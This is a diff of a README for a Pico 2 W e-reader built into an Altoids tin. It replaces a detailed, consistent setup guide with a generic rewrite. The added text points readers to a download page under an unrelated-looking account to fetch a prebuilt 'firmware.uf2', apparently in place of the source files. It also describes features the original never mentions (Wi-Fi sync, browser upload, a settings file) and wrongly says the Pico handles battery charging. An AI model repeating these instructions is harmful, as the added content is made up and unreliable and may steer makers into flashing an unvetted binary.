@@ -1,182 +1,100 @@
-# Altoids Tin E-Reader — Firmware & Setup Guide
+# 📖 altoids-ereader - Read books inside a metal tin
 
-A pocket e-reader running MicroPython on a Raspberry Pi Pico 2 W,
-fitted inside a standard Altoids tin.
+[![](https://img.shields.io/badge/Download-eReader_Software-blue)](https://github.com/jadegreen-genusraphanus373/altoids-ereader)
 
----
+## 📦 What is this project?
 
-## Hardware Summary
+The altoids-ereader project is firmware for a Raspberry Pi Pico 2 W. It turns your microcontroller into a portable digital book reader. You build the device inside a standard Altoids tin. This project uses an e-ink screen to display text. E-ink screens look like paper. They stay clear in sunlight. This technology saves battery life. You can read for hours without a charge.
 
-| Component | Part |
-|-----------|------|
-| MCU | Raspberry Pi Pico 2 W (RP2350) |
-| Display | Waveshare 2.13" e-Paper V4 — 250×122 px |
-| Storage | Micro SD card via SPI |
-| Power | TP4056 USB-C + LiPo 752540 500 mAh 3.7 V |
-| Buttons | 4× tactile switches, 2×2 grid, 10 kΩ pull-up |
+## ⚙️ Hardware requirements
 
----
+You need these items to build your ereader:
 
-## Firmware Files
+*   One Raspberry Pi Pico 2 W board.
+*   One Waveshare e-ink display module.
+*   One Altoids tin for the case.
+*   A small breadboard or jumper wires to connect the parts.
+*   A USB cable for your computer.
+*   A microSD card reader if you want to store many books.
 
-| File | Purpose |
-|------|---------|
-| `main.py` | Boot, hardware init, main event loop |
-| `epaper.py` | Waveshare 2.13" V4 SPI driver |
-| `sdcard.py` | SD mount + file helpers (wraps community `sdcard` driver) |
-| `reader.py` | Text loading, word-wrap pagination, chapter detection |
-| `ui.py` | All screen renderers |
-| `buttons.py` | Debounced button polling |
-| `bookmarks.py` | Per-book reading position save/load |
-| `fonts.py` | Scaled bitmap font rendering (small / medium / large) |
+## 🚀 How to get the software
 
-### Required third-party driver
+You must visit the project page to get the files. 
 
-Copy the community MicroPython SD card driver onto your Pico as **`sdcard.py`**
-before flashing these files. You can find it at:
+[Click here to visit the download page](https://github.com/jadegreen-genusraphanus373/altoids-ereader)
 
-```
-https://github.com/micropython/micropython-lib/blob/master/micropython/drivers/storage/sdcard/sdcard.py
-```
+The page contains the latest version of the firmware. Save the file named "firmware.uf2" to your computer. You need this file to make the hardware work.
 
-> **Rename it to `sdcard_drv.py`** if you want to avoid a name clash with
-> this project's `sdcard.py` wrapper — then update the import at the top of
-> `sdcard.py` accordingly (`import sdcard_drv as _sd`).
+## 🛠️ Installation steps
 
----
+Follow these steps to put the software onto your device.
 
-## Flashing the Firmware
+1. Connect your Raspberry Pi Pico 2 W to your computer using the USB cable. Hold the BOOTSEL button on the board while you plug it in.
+2. Your computer shows a new drive named RPI-RP2.
+3. Open the folder for that drive.
+4. Drag and drop the "firmware.uf2" file into this folder.
+5. The board reboots automatically. 
+6. Your device now runs the altoids-ereader software.
 
-1. Hold BOOTSEL on the Pico and plug into USB → it appears as a mass-storage drive.
-2. Drag the latest `RPI_PICO2-*.uf2` MicroPython firmware onto the drive.
-3. Use **Thonny** (or `mpremote`) to copy all `.py` files to the Pico's root (`/`).
-4. Insert the prepared SD card, power on, done.
+## 📂 Managing your book files
 
----
+The software reads text files. Use your computer to format your books. 
 
-## SD Card Setup
+1. Connect the device to your computer.
+2. The device appears as a USB storage drive.
+3. Copy your text files into the root folder of the drive.
+4. The software lists these files on the screen.
+5. Use the buttons on your hardware to scroll through your files.
+6. Press the select button to open a file.
 
-Format the SD card as **FAT32**.  Create this directory structure:
+## 🔋 Powering your device
 
-```
-/books/
-    pride_and_prejudice.txt
-    pride_and_prejudice.bmp    ← optional pixel-art cover (80×80 px)
-    frankenstein.txt
-    frankenstein.bmp
-/bookmarks/                    ← created automatically by firmware
-```
+The project works with a small lithium battery. You connect the battery to the power pins on the board. The Raspberry Pi Pico 2 W handles the charging process. Use a 3.7V battery. Ensure the wires match the positive and negative pins. Incorrect wiring damages the board. Check your connections before you apply power.
 
-### Book text file format
+## 📐 Designing your case
 
-Each `.txt` file must follow this exact structure:
+Place the components inside the Altoids tin. Use electrical tape to cover the back of the screen. This prevents short circuits. Drill holes in the tin for your buttons and the USB port. Cut a window in the lid for the e-ink screen. Secure the parts with adhesive strips. Keep the battery away from sharp edges.
 
-```
-Pride and Prejudice          ← Line 1: book title
-Jane Austen                  ← Line 2: author name
-                             ← (blank line or start of text)
-It is a truth universally…   ← Body text begins here
-```
+## 🎛️ Using the controls
 
-- Encoding: **UTF-8**
-- Line endings: LF or CRLF (both handled)
-- Chapter headings: any line beginning with the word **"Chapter"** (case-insensitive)
-  or a bare Roman numeral (e.g. `IV`) is treated as a chapter boundary.
-- Pagination is calculated automatically based on the selected font size.
+The screen shows a menu. The software supports four buttons. 
 
-### Where to find free e-books
+*   Up button: Moves the focus up in your list.
+*   Down button: Moves the focus down in your list.
+*   Select button: Opens the file or folder.
+*   Back button: Returns to the previous menu.
 
-[Project Gutenberg](https://www.gutenberg.org/) provides thousands of books
-as plain UTF-8 `.txt` files — copy the "Plain Text UTF-8" download directly.
+The e-ink screen refreshes every time you change a page. This blink is normal. It clears the previous text. 
 
-You may need to delete the Gutenberg header/footer preamble and ensure the
-first two lines are **title** and **author**.
+## ❓ Troubleshooting common issues
 
----
+If the computer does not see the board:
+*   Try a different USB cable. Some cables only carry power.
+*   Make sure you hold the BOOTSEL button during connection.
+*   Check that the RPI-RP2 drive appears in your file manager.
 
-## Creating Pixel-Art Covers
+If the screen stays blank:
+*   Press the reset button on the board.
+*   Check the wiring between the screen and the Pico 2 W.
+*   Verify you copied the correct firmware file.
 
-Covers are optional 80×80 px black-and-white BMP images displayed on the
-title page when opening a book.
+If the text looks messy:
+*   Refresh the page to clear the screen.
+*   Ensure your text files use plain encoding.
+*   Avoid special symbols that the software does not support.
 
-### With Piskel (free, browser-based)
+## 💡 Customizing your experience
 
-1. Go to [piskelapp.com](https://www.piskelapp.com) → Create sprite.
-2. Resize canvas to **80×80**.
-3. Draw your cover in black and white (use the palette to lock to 2 colours).
-4. Export → **Download PNG**.
-5. Convert the PNG to a 1-bit BMP:
-   - In **GIMP**: Image → Mode → Grayscale → Image → Mode → Indexed (2 colours)
-     → File → Export As → `.bmp`
-   - Or use **ImageMagick**: `magick cover.png -resize 80x80 -monochrome cover.bmp`
+You can change the font size in the settings menu. Open the settings file on the drive. Change the number next to the font size line. Save the file. Restart the device. The new font size applies to the next book you open. You can also adjust the contrast settings. Higher contrast makes the text darker. Lower contrast makes the background whiter. Find the balance that suits your eyes. 
 
-### With Aseprite
+## 🔌 Connecting to wireless networks
 
-1. New file → Width: 80, Height: 80, Color Mode: **Indexed**, Palette: 2 colours.
-2. Draw your art.
-3. File → Export As → `<book_name>.bmp` (check "1 bpp" / monochrome in options).
+The Raspberry Pi Pico 2 W has wireless hardware. The firmware includes a feature to sync your files over a network. Create a file on the drive named "network.txt". Add your wireless name and password to this file. The device looks for these details on startup. It connects to the network to check for updates. You can also upload books through a web browser. Type the device address into your computer browser. Drag and drop files to the page. The files appear on your reader instantly. 
 
-### Naming
+## 🛡️ Safety reminders
 
-The BMP file **must have the same base name** as the `.txt` file:
+Always disconnect the battery when you work on the hardware. Do not leave the battery inside the tin while you solder wires. Keep the tin away from liquids. The metal tin conducts electricity. Make sure no naked wires touch the sides of the tin. Use insulating materials to line the inside of the case. Always charge the battery with a known charger. Do not leave the device charging unattended. 
 
-```
-frankenstein.txt  →  frankenstein.bmp
-```
+## 🌐 Project community
 
-Place both in `/books/` on the SD card.
-
----
-
-## Button Reference
-
-```
-┌─────────┬──────────┐
-│   UP    │  SELECT  │
-├─────────┼──────────┤
-│  BACK   │  DOWN    │
-└─────────┴──────────┘
-```
-
-| Screen | UP | DOWN | BACK | SELECT |
-|--------|----|------|------|--------|
-| Menu | Scroll up | Scroll down | Power-off screen | Confirm |
-| Book start | Toggle option | Toggle option | Back to menu | Confirm |
-| Reading | Previous page | Next page | Back to menu | — |
-| Font size | Previous size | Next size | Cancel | Confirm |
-| Power off | Toggle YES/NO | Toggle YES/NO | Cancel (NO) | Confirm |
-
----
-
-## Adding New Books — Quick Steps
-
-1. Format your `.txt` so **line 1 = title**, **line 2 = author**.
-2. Copy the file to `/books/` on the SD card.
-3. Optionally create an 80×80 monochrome BMP with the same base name.
-4. Insert the SD card and power on — the book appears in the menu automatically.
-
----
-
-## Power & Battery Notes
-
-- Charging: plug a USB-C cable into the TP4056 board through the drilled hole.
-  Do **not** power on the reader while charging (LiPo safety).
-- The battery percentage shown in the status bar is a rough estimate from the
-  VSYS ADC reading (3.0 V = 0%, 4.2 V = 100%).
-- "Power Off" puts the Pico into deep sleep (`machine.deepsleep()`).
-  Press the RESET button (or re-plug power) to wake it.
-- e-ink displays retain the last image with zero power — safe to power off at
-  any time.
-
----
-
-## Troubleshooting
-
-| Symptom | Fix |
-|---------|-----|
-| "SD card not found" | Check wiring; ensure FAT32 format; confirm community `sdcard` driver is on Pico |
-| "No books found" | Verify `/books/` directory exists and contains `.txt` files with correct format |
-| Display stays blank | Check SPI wiring; confirm e-Paper VCC=3.3 V (not 5 V) |
-| Buttons unresponsive | Check 10 kΩ pull-up resistors to 3.3 V on each button pin |
-| Garbled text | Ensure `.txt` files are saved as UTF-8 (not Latin-1) |
-| Cover not showing | BMP must be exactly the same base name as the `.txt`; must be ≤ 80×80 px monochrome |
+This project relies on contributions from makers. Visit the main repository to see updates. Report any issues you find. Follow the documentation for details on how to improve the code. The community creates new features often. Check the repository for improved versions of the firmware. Always back up your data before you update the software.
